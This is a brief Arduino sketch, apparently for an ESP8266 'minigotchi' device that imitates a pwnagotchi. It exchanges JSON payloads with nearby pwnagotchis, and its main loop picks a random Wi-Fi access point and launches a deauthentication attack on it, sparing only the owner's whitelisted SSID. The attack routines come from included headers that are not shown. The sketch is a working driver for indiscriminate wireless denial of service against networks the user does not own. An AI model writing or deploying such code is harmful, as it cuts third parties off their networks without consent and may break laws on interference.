// minigotchi.ino: everything implemented here

#include "pwnagotchi.h"
#include "deauth.h"
#include "packet.h"

Pwnagotchi pwnagotchi;
PacketSender packetSender;
DeauthAttack deauthAttack;

void setup() {
    Serial.begin(115200); // this is the rate for the serial monitor
    deauthAttack.addToWhitelist("SSID"); // set your ssid you want to use
    if (SPIFFS.begin()) {
        // file path
        packetSender.sendJsonPayloadFromFile("/packet.json");
    } else {
        Serial.println("Failed to mount file, does the file exist?");
  }
}

void loop() {
    // get local payload from local pwnagotchi
    pwnagotchi.detectPwnagotchi("de:ad:be:ef:de:ad");

    // send payload

    // deauth a random ap
    deauthAttack.selectRandomAP();
    deauthAttack.startRandomDeauth();
}
